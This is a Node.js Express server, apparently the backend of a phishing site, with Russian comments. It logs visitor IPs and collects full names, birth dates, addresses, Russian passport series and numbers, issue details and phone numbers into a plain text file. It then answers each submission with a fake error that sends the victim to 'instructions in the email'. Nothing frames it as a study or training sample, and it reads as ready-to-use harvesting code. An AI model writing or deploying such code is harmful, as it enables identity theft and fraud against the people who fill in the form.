// Импортируем необходимые модули
const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Функция для получения реального IP пользователя
function getClientIp(req) {
    const xForwardedFor = req.headers['x-forwarded-for'];
    return xForwardedFor ? xForwardedFor.split(',')[0].trim() : req.socket.remoteAddress;
}

// Функция для логирования IP
function logIpToFile(clientIp) {
    const logMessage = `IP: ${clientIp} - Date: ${new Date().toISOString()}\n`;
    
    fs.appendFile(path.join(__dirname, 'ip_logs.txt'), logMessage, (err) => {
        if (err) {
            console.error('Ошибка при логировании IP:', err);
        }
    });

    console.log(logMessage);
}

// Маршрут для логирования IP при заходе на сайт
app.post('/log-ip', (req, res) => {
    const clientIp = getClientIp(req);
    logIpToFile(clientIp); // Логируем IP
    res.send('IP адрес логирован.');
});

// Маршрут для отправки HTML-страницы
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Обработчик для POST-запроса с данными формы
app.post('/', (req, res) => {
    // Получаем данные из формы
    const formData = req.body;

    // Получаем IP-адрес
    const clientIp = getClientIp(req);

    // Получаем текущие дату и время в читаемом формате
    const currentDate = new Date().toLocaleString('ru-RU', {
        day: 'numeric',
        month: 'long',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric'
    });

    // Форматируем данные для удобного отображения
    const formattedData = `
    IP-адрес: ${clientIp}
    Время отправки формы: ${currentDate}
    ФИО: ${formData['full-name']}
    Дата рождения: ${formData['dob']}
    Место проживания: ${formData['address']}
    Серия паспорта: ${formData['passport-series']}
    Номер паспорта: ${formData['passport-number']}
    Место рождения: ${formData['birthplace']}
    Дата выдачи паспорта: ${formData['passport-issue-date']}
    Место выдачи паспорта: ${formData['passport-issue-place']}
    Адрес регистрации: ${formData['registration-address']}
    Номер телефона: ${formData['phone-number']}
    ----------------------------------------
    `;

    // Выводим данные в консоль
    console.log('Полученные данные формы:', formData, 'IP:', clientIp, 'Время захода:', currentDate);

    // Сохраняем данные в файл с разделителями
    fs.appendFile(path.join(__dirname, 'form_data.txt'), formattedData + '\n', (err) => {
        if (err) {
            console.error('Ошибка при записи данных формы:', err);
        }
    });

    // Отправляем ответ клиенту
    res.send('Ошибка отправки персональных данных! Воспользуйтесь инструкцией из письма на электронной почте.');
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
